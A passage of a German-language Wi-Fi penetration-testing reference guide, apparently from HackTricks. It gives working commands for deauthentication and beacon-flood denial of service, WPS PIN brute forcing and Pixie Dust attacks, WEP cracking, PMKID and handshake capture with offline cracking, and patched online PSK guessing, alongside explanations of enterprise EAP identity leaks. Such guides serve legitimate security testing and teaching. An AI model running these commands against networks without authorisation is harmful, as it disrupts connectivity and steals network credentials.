# Pentesting WLAN

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende WLAN-Befehle
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Werkzeuge

### Hijacker & NexMon (Android internes Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**airgeddon mit docker ausführen**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Von: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Es kann Evil Twin-, KARMA- und Known Beacons-Angriffe durchführen und anschließend eine phishing-Vorlage verwenden, um das tatsächliche Netzwerkpasswort zu erhalten oder social network credentials abzufangen.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Dieses Tool automatisiert **WPS/WEP/WPA-PSK**-Angriffe. Es wird automatisch:

- Setzt das Interface in den monitor mode
- Scannt nach möglichen Netzwerken - und lässt dich das/die Opfer auswählen
- Wenn WEP - startet WEP-Angriffe
- Wenn WPA-PSK
- Wenn WPS: Pixie dust attack und der bruteforce attack (Vorsicht: der brute-force attack kann lange dauern). Beachte, dass es nicht null PIN oder database/generated PINs ausprobiert.
- Versucht, das PMKID vom AP zu erfassen, um es zu cracken
- Versucht, Clients des AP zu deauthentifizieren, um einen Handshake zu erfassen
- Wenn PMKID oder Handshake, versucht es zu bruteforcen mit top5000 passwords.

## Angriffsübersicht

- **DoS**
- Deauthentication/disassociation -- Trennt alle (oder ein bestimmtes ESSID/Client)
- Random fake APs -- Netze verbergen, Scanner möglicherweise abstürzen lassen
- Overload AP -- Versucht, den AP außer Betrieb zu setzen (normalerweise nicht sehr nützlich)
- WIDS -- Mit dem IDS spielen
- TKIP, EAPOL -- Einige spezifische Angriffe, um bestimmte APs zu DoSen
- **Cracking**
- Crack **WEP** (verschiedene Tools und Methoden)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (mit oder ohne DoS)
- **Open** Evil Twin \[+ DoS] -- Nützlich, um captive portal creds zu erfassen und/oder LAN-Angriffe durchzuführen
- **WPA-PSK** Evil Twin -- Nützlich für Netzwerkangriffe, wenn das Passwort bekannt ist
- **WPA-MGT** -- Nützlich, um Firmen-Credentials zu erfassen
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Nützlich, um captive portal creds zu erfassen und/oder LAN-Angriffe durchzuführen
- **+ WPA** -- Nützlich, um WPA handshakes zu erfassen

## Kurze Hinweise zu Open/OWE-Netzwerken

- **Passive capture** bei open SSIDs funktioniert weiterhin mit monitor mode und tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) führt einen pro-Station-Schlüsselaustausch durch (kein PSK), sodass air frames selbst bei "open" SSIDs verschlüsselt sind. Da es auf WPA3 basiert, erzwingt es außerdem **802.11w PMF**, das gefälschte deauth/disassoc frames blockiert.
- OWE **authentifiziert Joiner nicht**: jeder kann sich assoziieren, überprüfe also die client isolation statt Marketing-Aussagen zu vertrauen. Ohne Isolation funktionieren weiterhin ARP spoofing oder responder-style poisoning auf dem lokalen L2.
- **Evil Twin** bleibt auf open/OWE SSIDs durch ein stärkeres Signal möglich; PMF entfernt nur die deauth-Abkürzung. Wenn Opfer ein gefälschtes TLS cert akzeptieren, ist ein vollständiges HTTP(S) MitM wiederhergestellt.
- Broadcast poisoning in offenem Guest-Wi-Fi liefert leicht creds/hashes (LLMNR/NBT-NS/mDNS). Siehe:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Beschreibung von** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication**-Angriffe, eine verbreitete Methode im Wi-Fi-Hacking, beinhalten das Fälschen von "management" frames, um Geräte gewaltsam von einem Netzwerk zu trennen. Diese unverschlüsselten Pakete täuschen Clients vor, sie stammten vom legitimen Netzwerk, wodurch Angreifer WPA handshakes zum Cracken sammeln oder Verbindungen dauerhaft stören können. Diese Taktik, alarmierend in ihrer Einfachheit, wird häufig eingesetzt und hat erhebliche Auswirkungen auf die Netzwerksicherheit.

**Deauthentication mit Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 bedeutet deauthentication
- 1 ist die Anzahl der deauths, die gesendet werden sollen (du kannst mehrere senden, wenn du möchtest); 0 bedeutet, dass sie kontinuierlich gesendet werden
- -a 00:14:6C:7E:40:80 ist die MAC-Adresse des access point
- -c 00:0F:B5:34:30:30 ist die MAC-Adresse des Clients, der deauthenticate werden soll; wenn dies weggelassen wird, wird broadcast deauthentication gesendet (funktioniert nicht immer)
- ath0 ist der Interface-Name

### Disassociation Packets

**Disassociation packets**, ähnlich wie **deauthentication packets**, sind eine Art management frame, die in Wi-Fi-Netzen verwendet werden. Diese Pakete dienen dazu, die Verbindung zwischen einem Gerät (z. B. einem Laptop oder Smartphone) und einem access point (AP) zu trennen. Der Hauptunterschied zwischen disassociation und deauthentication liegt in ihren Einsatzszenarien. Während ein AP **deauthentication packets** aussendet, um rogue devices explizit aus dem Netzwerk zu entfernen, werden **disassociation packets** typischerweise gesendet, wenn der AP heruntergefahren, neu gestartet oder versetzt wird, wodurch die Trennung aller verbundenen nodes erforderlich wird.

**Dieser Angriff kann mit mdk4(mode "d") durchgeführt werden:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Weitere DOS-Angriffe mit mdk4**

**Siehe** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Sendet Beacon-Frames, um Clients gefälschte APs anzuzeigen. Das kann manchmal Netzwerkscanner und sogar Treiber zum Absturz bringen!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Das Senden von authentication frames an alle erreichbaren Access Points (APs) in Reichweite kann diese APs überlasten, insbesondere wenn zahlreiche Clients beteiligt sind. Dieser starke Traffic kann zu Systeminstabilität führen und dazu führen, dass einige APs einfrieren oder sogar neu starten.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Das Probing von Access Points (APs) überprüft, ob eine SSID korrekt angezeigt wird, und bestätigt die Reichweite des AP. Diese Technik, kombiniert mit **bruteforcing hidden SSIDs** mit oder ohne wordlist, hilft dabei, versteckte Netzwerke zu identifizieren und zu betreten.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Das Senden zufälliger oder doppelter Pakete an verschiedene QoS-Queues kann Michael Countermeasures auf **TKIP APs** auslösen und zu einer einminütigen AP-Abschaltung führen. Diese Methode ist eine effiziente **DoS** (Denial of Service) Angriffstaktik.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Das Überfluten eines AP mit **EAPOL Start frames** erzeugt **fake sessions**, überlastet den AP und blockiert legitime Clients. Alternativ können durch das Injizieren von **fake EAPOL Logoff messages** Clients zwangsweise getrennt werden; beide Methoden unterbrechen effektiv den Netzwerkdienst.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Angriffe auf IEEE 802.11s Mesh-Netzwerke**

Verschiedene Angriffe auf Link-Management und Routing in Mesh-Netzwerken.

**ATTACK MODE w: WIDS-Verwirrung**

Das Cross-connecting von clients mit mehreren WDS-Knoten oder gefälschten rogue APs kann Intrusion Detection and Prevention Systems manipulieren, Verwirrung stiften und potenziellen Missbrauch des Systems ermöglichen.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Ein Packet Fuzzer, der diverse packet sources bietet und eine umfassende Auswahl an Modifiers zur packet manipulation enthält.

### **Airggedon**

_**Airgeddon**_ bietet die meisten der in den vorherigen Kommentaren vorgeschlagenen Angriffe:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) vereinfacht den Prozess, Geräte mit einem Router zu verbinden, und erhöht die Geschwindigkeit und Benutzerfreundlichkeit der Einrichtung für Netzwerke, die mit **WPA** oder **WPA2** Personal verschlüsselt sind. Es ist wirkungslos gegen die leicht kompromittierbare **WEP**-Sicherheit. WPS verwendet eine 8-stellige PIN, die in zwei Hälften validiert wird, wodurch es anfällig für Brute-Force-Angriffe ist, da die Anzahl der Kombinationen begrenzt ist (11.000 Möglichkeiten).

### WPS Bruteforce

Es gibt 2 Haupttools, um diese Aktion durchzuführen: Reaver und Bully.

- **Reaver** wurde entwickelt, um einen robusten und praxisnahen Angriff gegen WPS darzustellen und wurde gegen eine große Vielzahl von Access Points und WPS-Implementierungen getestet.
- **Bully** ist eine **neue Implementierung** des WPS-Brute-Force-Angriffs, geschrieben in C. Es hat mehrere Vorteile gegenüber dem ursprünglichen Reaver-Code: weniger Abhängigkeiten, verbesserte Speicher- und CPU-Leistung, korrekte Behandlung von endianness und eine robustere Optionsauswahl.

Der Angriff nutzt die Verwundbarkeit des **WPS PIN** aus, insbesondere die Offenlegung der ersten vier Ziffern und die Rolle der letzten Ziffer als Prüfsumme, was den Brute-Force-Angriff erleichtert. Abwehrmaßnahmen gegen Brute-Force-Angriffe, wie das **blocking MAC addresses** aggressiver Angreifer, erfordern jedoch **MAC address rotation**, um den Angriff fortzusetzen.

Nach dem Erhalt des WPS PIN mit Tools wie Bully oder Reaver kann der Angreifer den WPA/WPA2 PSK ableiten und so einen **dauerhaften Netzwerkzugang** sicherstellen.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Dieser verfeinerte Ansatz zielt auf WPS PINs unter Ausnutzung bekannter Schwachstellen ab:

1. **Pre-discovered PINs**: Nutze eine Datenbank bekannter PINs, die mit bestimmten Herstellern verknüpft ist, die dafür bekannt sind, einheitliche WPS PINs zu verwenden. Diese Datenbank korreliert die ersten drei octets der MAC-addresses mit wahrscheinlichen PINs für diese Hersteller.
2. **PIN Generation Algorithms**: Verwende Algorithmen wie ComputePIN und EasyBox, die WPS PINs basierend auf der MAC-address des AP berechnen. Der Arcadyan-Algorithmus benötigt zusätzlich eine device ID, was dem PIN-Generierungsprozess eine weitere Ebene hinzufügt.

### WPS Pixie Dust attack

**Dominique Bongard** entdeckte eine Schwachstelle in einigen Access Points (APs) bei der Erzeugung von Geheimcodes, bekannt als **nonces** (**E-S1** und **E-S2**). Wenn diese nonces herausgefunden werden können, wird das Knacken des WPS PIN des APs einfach. Der AP gibt den PIN innerhalb eines speziellen Codes (hash) preis, um zu beweisen, dass er legitim und kein rogue AP ist. Diese nonces sind im Wesentlichen die "keys", um den "safe" zu öffnen, der den WPS PIN enthält. Mehr dazu findet sich [hier](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Kurz gesagt besteht das Problem darin, dass einige APs nicht zufällig genug Schlüssel zur Verschlüsselung des PIN während des Verbindungsprozesses verwendeten. Das macht den PIN anfällig dafür, von außerhalb des Netzwerks erraten zu werden (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Wenn du das Gerät nicht in den monitor mode versetzen möchtest, oder `reaver` und `bully` Probleme haben, kannst du [OneShot-C](https://github.com/nikita-yfh/OneShot-C) ausprobieren. Dieses Tool kann eine Pixie Dust attack ausführen, ohne den monitor mode aktivieren zu müssen.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Bei einigen schlecht gestalteten Systemen gewährt ein **Null PIN** (eine leere oder nicht vorhandene PIN) Zugriff, was ziemlich ungewöhnlich ist. Das Tool **Reaver** kann auf diese Schwachstelle testen, im Gegensatz zu **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Alle vorgeschlagenen WPS-Angriffe können einfach mit _**airgeddon.**_ durchgeführt werden.

![](<../../images/image (219).png>)

- 5 und 6 lassen dich **deinen eigenen PIN** ausprobieren (falls vorhanden)
- 7 und 8 führen den **Pixie Dust attack** aus
- 13 erlaubt dir, den **NULL PIN** zu testen
- 11 und 12 **sammeln die mit dem ausgewählten AP verbundenen PINs aus verfügbaren Datenbanken** und **generieren** mögliche **PINs** mit: ComputePIN, EasyBox und optional Arcadyan (empfohlen, warum nicht?)
- 9 und 10 testen **jeden möglichen PIN**

## **WEP**

**Warum es zusammenbricht**

- RC4 seed ist nur **IV (24 bits) + shared key**. Der IV ist cleartext, winzig (2^24) und wiederholt sich schnell, sodass ciphertexts mit derselben IV den keystream wiederverwenden.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; vorhersehbare Header + RC4 KSA biases (**FMS**) erlauben es dir, Schlüsselbytes zu “voten”. **PTW** optimiert das, indem es ARP traffic verwendet, um die Anforderungen von Millionen auf zehntausende Pakete zu senken.
- Integrity is only **CRC32** (linear/unkeyed), so an attacker can flip bits and recompute CRC32 without the key → packet forgery/replay/ARP injection while waiting for IVs.

Der praktische Bruch ist deterministisch:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon bietet weiterhin einen "All-in-One" WEP workflow, wenn du eine geführte UI bevorzugst.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

2018 hat **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) eine neue Angriffsmethode vorgestellt, die insofern einzigartig ist, dass sie nur **ein einziges Paket** benötigt und keine Clients erfordert, die mit dem Ziel-AP verbunden sind — lediglich eine Interaktion zwischen Angreifer und AP.

Viele moderne Router fügen dem **ersten EAPOL**-Frame während der Assoziierung ein **optionales Feld** hinzu, bekannt als `Robust Security Network`. Dieses enthält den `PMKID`.

Wie der Originalbeitrag erklärt, wird der **PMKID** aus bekannten Daten erstellt:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Da der "PMK Name" konstant ist, die BSSID des AP und der Station bekannt sind und das `PMK` identisch mit dem aus einem vollständigen 4-way handshake ist, kann **hashcat** diese Informationen verwenden, um den PSK zu cracken und die Passphrase wiederherzustellen!

Um diese Informationen zu **gather** und das Passwort lokal zu **bruteforce**, kannst du Folgendes tun:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **PMKIDs captured** werden in der **console** angezeigt und außerdem **gespeichert** in \_ **/tmp/attack.pcap**\_\
Jetzt konvertiere die Aufnahme in das **hashcat/john**-Format und knacke sie:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Bitte beachten Sie, dass das Format eines korrekten hash aus **4 Teilen** besteht, wie: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Wenn er **nur** **3 Teile** enthält, ist er **ungültig** (die PMKID capture war nicht gültig).

Beachten Sie, dass `hcxdumptool` **also capture handshakes** (so etwas wird erscheinen: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Sie können die **handshakes** mit `cap2hccapx` in das **hashcat**/**john**-Format **konvertieren**.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Mir ist aufgefallen, dass einige mit diesem Tool erfasste **handshakes** selbst bei bekanntem korrekten **password** nicht **cracked** werden konnten. Ich empfehle, wenn möglich **handshakes** zusätzlich auf traditionelle Weise zu erfassen oder mehrere davon mit diesem Tool zu sammeln._

### Handshake-Erfassung

Ein Angriff auf **WPA/WPA2**-Netzwerke kann ausgeführt werden, indem man einen **handshake** erfasst und versucht, das **password** **offline** zu **cracken**. Dieser Prozess beinhaltet das Überwachen der Kommunikation eines bestimmten Netzwerks und der **BSSID** auf einem bestimmten **channel**. Hier ist eine vereinfachte Anleitung:

1. Ermitteln Sie die **BSSID**, den **channel** und einen **connected client** des Zielnetzwerks.
2. Verwenden Sie `airodump-ng`, um den Netzwerkverkehr auf dem angegebenen **channel** und der **BSSID** zu überwachen, in der Hoffnung, einen **handshake** zu erfassen. Der Befehl sieht wie folgt aus:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Um die Chance zu erhöhen, einen handshake zu erfassen, trennen Sie den Client kurzzeitig vom Netzwerk, um eine re-authentication zu erzwingen. Dies kann mit dem Befehl `aireplay-ng` gemacht werden, der deauthentication-Pakete an den Client sendet:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network._

Sobald in `airodump-ng` einige handshake-Informationen erscheinen, bedeutet das, dass der handshake erfasst wurde und du das Aufzeichnen stoppen kannst:

![](<../../images/image (172) (1).png>)

Sobald der handshake erfasst wurde, kannst du ihn mit `aircrack-ng` **crack**en:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Prüfen, ob ein handshake in der Datei vorhanden ist

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Wenn dieses Tool einen unvollständigen handshake einer ESSID vor dem abgeschlossenen findet, erkennt es den gültigen nicht._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Schnelleres Online-PSK-Guessing über `wpa_supplicant` ctrl socket (keine Clients/PMKID)

Wenn keine Clients in der Nähe sind und der AP PMKID ablehnt, kannst du PSKs online iterieren, ohne supplicants neu zu starten:

- Patche `wpa_supplicant.c`, um `dur = 0;` in der auth failure backoff logic zu erzwingen (etwa bei `ssid->auth_failures`), wodurch der temporary-disable timer effektiv deaktiviert wird.
- Starte einen einzelnen Daemon mit einem control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Steuere es über die control interface und verwende denselben scan und dasselbe network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Eine kleine Python-Schleife, die Socket-Ereignisse (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) liest, kann ~100 Versuche in ~5 Minuten testen, ohne Scan-Overhead. Sie ist weiterhin auffällig und detektierbar, vermeidet jedoch Prozessneustarts pro Versuch und Backoff-Verzögerungen.

## **WPA Enterprise (MGT)**

In **Enterprise-WiFi-Umgebungen stoßen Sie auf verschiedene Authentifizierungsmethoden**, die jeweils unterschiedliche Sicherheitsniveaus und Management-Funktionen bieten. Wenn Sie Tools wie `airodump-ng` verwenden, um den Netzwerkverkehr zu untersuchen, können Ihnen Kennungen für diese Authentifizierungstypen auffallen. Einige gängige Methoden sind:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Diese Methode unterstützt Hardware-Tokens und One-Time-Passwords innerhalb von EAP-PEAP. Im Gegensatz zu MSCHAPv2 verwendet sie keine peer challenge und sendet Passwörter im Klartext an den Access Point, wodurch ein Risiko für Downgrade-Angriffe entsteht.
2. **EAP-MD5 (Message Digest 5)**:
- Basiert darauf, dass der Client den MD5-Hash des Passworts sendet. Es wird **nicht empfohlen**, da es anfällig für Wörterbuchangriffe ist, keine Serverauthentifizierung bietet und keine sessionspezifischen WEP-Keys erzeugen kann.
3. **EAP-TLS (Transport Layer Security)**:
- Verwendet sowohl Client- als auch Serverzertifikate zur Authentifizierung und kann dynamisch benutzer- und sessionbasierte WEP-Keys zur Sicherung der Kommunikation erzeugen.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Bietet gegenseitige Authentifizierung über einen verschlüsselten Tunnel sowie eine Methode zur Ableitung dynamischer, pro-Benutzer, pro-Session gültiger WEP-Keys. Es erfordert nur Server-Zertifikate, während die Clients Anmeldeinformationen verwenden.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funktioniert ähnlich wie EAP, indem ein TLS-Tunnel für geschützte Kommunikation erstellt wird. Dadurch können schwächere Authentifizierungsprotokolle oberhalb von EAP verwendet werden, weil der Tunnel Schutz bietet.
- **PEAP-MSCHAPv2**: Wird oft einfach PEAP genannt; es kombiniert den verwundbaren MSCHAPv2 Challenge/Response-Mechanismus mit einem schützenden TLS-Tunnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Ähnlich zu EAP-TLS, baut jedoch einen TLS-Tunnel auf, bevor Zertifikate ausgetauscht werden, und bietet so eine zusätzliche Sicherheitsschicht.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Benutzername-Erfassung

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

Selbst bei Verwendung eines der sichersten Authentifizierungsverfahren: **PEAP-EAP-TLS**, ist es möglich, den **im EAP-Protokoll gesendeten Benutzernamen zu erfassen**. Dazu muss eine Authentifizierungskommunikation aufgezeichnet werden (starte `airodump-ng` auf dem entsprechenden Kanal und `wireshark` auf derselben Schnittstelle) und filtere die Pakete nach `eapol`.\
Im Paket "**Response, Identity**" erscheint der **Benutzername** des Clients.

![](<../../images/image (850).png>)

### Anonyme Identitäten

Identitätsverschleierung wird sowohl von EAP-PEAP als auch von EAP-TTLS unterstützt. Im Kontext eines WiFi-Netzwerks wird eine EAP-Identity-Anfrage typischerweise vom Access Point (AP) während des Association-Prozesses initiiert. Um den Schutz der Benutzeranonymität sicherzustellen, enthält die Antwort des EAP-Clients auf dem Gerät des Benutzers nur die für den initialen RADIUS-Server zur Verarbeitung der Anfrage notwendigen minimalen Informationen. Dieses Konzept wird durch die folgenden Szenarien veranschaulicht:

- EAP-Identity = anonymous
- In diesem Szenario verwenden alle Benutzer die pseudonyme Kennung "anonymous" als Benutzerkennung. Der initiale RADIUS-Server fungiert entweder als EAP-PEAP- oder EAP-TTLS-Server und ist für die Server-Seite des PEAP- bzw. TTLS-Protokolls zuständig. Das innere (geschützte) Authentifizierungsverfahren wird dann entweder lokal abgewickelt oder an einen entfernten (Home-)RADIUS-Server delegiert.
- EAP-Identity = anonymous@realm_x
- In diesem Fall verbergen Benutzer aus verschiedenen Realms ihre Identitäten, geben jedoch ihren jeweiligen Realm an. Dadurch kann der initiale RADIUS-Server die EAP-PEAP- oder EAP-TTLS-Anfragen an RADIUS-Server in ihren Home-Realms proxien, die als PEAP- oder TTLS-Server agieren. Der initiale RADIUS-Server operiert dabei ausschließlich als RADIUS-Relay-Knoten.
- Alternativ kann der initiale RADIUS-Server als EAP-PEAP- oder EAP-TTLS-Server fungieren und entweder das geschützte Authentifizierungsverfahren selbst abwickeln oder es an einen anderen Server weiterleiten. Diese Option ermöglicht die Konfiguration unterschiedlicher Richtlinien für verschiedene Realms.

Bei EAP-PEAP, nachdem der TLS-Tunnel zwischen dem PEAP-Server und dem PEAP-Client aufgebaut ist, initiiert der PEAP-Server eine EAP-Identity-Anfrage und überträgt sie durch den TLS-Tunnel. Der Client antwortet auf diese zweite EAP-Identity-Anfrage, indem er eine EAP-Identity-Antwort mit der tatsächlichen Identität des Benutzers durch den verschlüsselten Tunnel sendet. Dieser Ansatz verhindert effektiv, dass die wahre Identität des Benutzers von jemandem, der den 802.11-Verkehr belauscht, offengelegt wird.

EAP-TTLS folgt einem leicht abweichenden Verfahren. Bei EAP-TTLS authentifiziert sich der Client typischerweise mit PAP oder CHAP, abgesichert durch den TLS-Tunnel. In diesem Fall fügt der Client dem initialen TLS-Paket nach Tunnelaufbau ein User-Name-Attribut sowie entweder ein Password- oder CHAP-Password-Attribut bei.

Unabhängig vom gewählten Protokoll erfährt der PEAP/TTLS-Server die wahre Identität des Benutzers, nachdem der TLS-Tunnel aufgebaut wurde. Die wahre Identität kann als user@realm oder einfach user dargestellt werden. Wenn der PEAP/TTLS-Server auch für die Authentifizierung des Benutzers zuständig ist, besitzt er nun die Identität des Benutzers und fährt mit dem durch den TLS-Tunnel geschützten Authentifizierungsverfahren fort. Alternativ kann der PEAP/TTLS-Server eine neue RADIUS-Anfrage an den Home-RADIUS-Server des Benutzers weiterleiten. Diese neue RADIUS-Anfrage lässt die PEAP- oder TTLS-Protokollschicht weg. Wenn das geschützte Authentifizierungsverfahren EAP ist, werden die inneren EAP-Nachrichten ohne die EAP-PEAP- bzw. EAP-TTLS-Hülle an den Home-RADIUS-Server weitergeleitet. Das User-Name-Attribut der ausgehenden RADIUS-Nachricht enthält die wahre Identität des Benutzers und ersetzt den anonymen User-Name aus der eingehenden RADIUS-Anfrage. Wenn das geschützte Authentifizierungsverfahren PAP oder CHAP ist (nur von TTLS unterstützt), werden der User-Name und andere Authentifizierungsattribute, die aus dem TLS-Payload extrahiert wurden, in der ausgehenden RADIUS-Nachricht eingesetzt und verdrängen den anonymen User-Name und die TTLS EAP-Message-Attribute der eingehenden RADIUS-Anfrage.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-basierte Wi‑Fi-Authentifizierung mit EAP‑SIM/EAP‑AKA über 802.1X kann ein Leak der permanenten Teilnehmerkennung (IMSI) im Klartext während der unauthentifizierten Identitätsphase verursachen, wenn die Deployment-Konfiguration keine Pseudonyme/geschützten Identitäten implementiert oder keinen TLS-Tunnel um das innere EAP legt.

Where the leak happens (high level):
